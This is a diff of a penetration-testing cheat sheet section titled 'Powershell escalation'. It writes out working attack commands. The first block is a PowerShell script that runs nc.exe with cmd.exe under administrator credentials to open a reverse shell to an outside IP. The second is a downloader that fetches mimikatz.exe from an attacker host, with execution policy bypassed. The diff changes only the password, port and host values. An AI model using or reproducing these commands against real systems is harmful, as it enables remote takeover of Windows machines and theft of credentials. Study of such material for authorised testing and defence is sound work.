@@ -157,17 +157,17 @@
 
 10. Powershell escalation
 	$ echo $username = 'administrator' > muchwow.ps1
-	$ echo $password = '>47J3ez%yHijKg8' >> muchwow.ps1
+	$ echo $password = 'password' >> muchwow.ps1
 	$ echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> muchwow.ps1
 	$ echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> muchwow.ps1
-	$ echo Start-Process nc.exe -ArgumentList ('-e','cmd.exe','10.11.0.174 4434') -Credential $credential >> muchwow.ps1
+	$ echo Start-Process nc.exe -ArgumentList ('-e','cmd.exe','10.11.0.174 4433') -Credential $credential >> muchwow.ps1
 	$ powershell -ExecutionPolicy Bypass -File c:\Windows\temp\muchwow.ps1
 
 	# Download Files
 	$ echo $storageDir = $pwd > wget.ps1
 	$ echo $webclient = New-Object System.Net.WebClient >>wget.ps1
-	$ echo $url = "http://10.11.0.174/muchwow/happykatz32.exe" >>wget.ps1
-	$ echo $file = "happykatz32.exe" >>wget.ps1
+	$ echo $url = "http://192.168.1.2/mimikatz.exe" >>wget.ps1
+	$ echo $file = "mimikatz.exe" >>wget.ps1
 	$ echo $webclient.DownloadFile($url,$file) >>wget.ps1
 	$ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 	
